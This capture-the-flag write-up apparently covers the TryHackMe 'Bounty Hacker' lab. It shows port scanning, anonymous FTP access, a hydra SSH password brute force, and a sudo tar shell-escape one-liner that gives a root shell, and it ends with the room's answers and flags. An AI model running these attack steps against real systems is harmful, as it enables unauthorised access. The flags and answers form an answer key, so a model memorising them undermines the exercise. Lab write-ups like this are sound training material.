# Bounty Hacker

> Lorenzo De Simone | 21.05.2023

## Hosts 

```bash
export IP=10.10.224.202
``` 

## Enumeration

### Nmap

```console
└─$ sudo nmap -sV -sC -oN nmap/inital 10.10.224.202        
[sudo] password for lorenzo: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 11:41 CEST
Nmap scan report for 10.10.224.202
Host is up (0.036s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.48.50
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.71 seconds
``` 
From the nmap scan we can see that **tcp/21**, **tcp/22** and **tcp/80** are the open ports on this machine

### Directory busting / Nikto

```console
gobuster dir -u http://10.10.224.202 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log
```

```console
nikto -url http://10.10.224.202 | tee nikto.log
```

No interesting results from gobuster and nikto, maybe there is something on the ftp server on **tcp/21**

### FTP Server

Anonymous login was enabled, on the server there where 2 files, **tasks.txt** and **locks.txt**

```console
cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

**locks.txt** Seems to be passwords, maybe for the lin user?

## Exploitation

### Access to the system

```console
hydra -l lin -P locks.txt 10.10.224.202 ssh -t 4      
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-21 12:06:01
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.224.202:22/
[22][ssh] host: 10.10.224.202   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-21 12:06:08

``` 
Hydra was able to find the passwort for lin. Found the user flag in **/home/lin/Desktop**

### Privilege Escalation

Machine seems to be broken but, lin should be able to run tar as sudo. Running tar as sudo we can spawn a **root shell**

GTFOBIN:
```console
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

## Flags 

1. Who wrote the task list?
> lin

2. What service can you bruteforce with the text file found?
> ssh

3. What is the users password? 
> RedDr4gonSynd1cat3 

4. user.txt
> THM{CR1M3_SyNd1C4T3}

5. root.txt
> THM{80UN7Y_h4cK3r} 


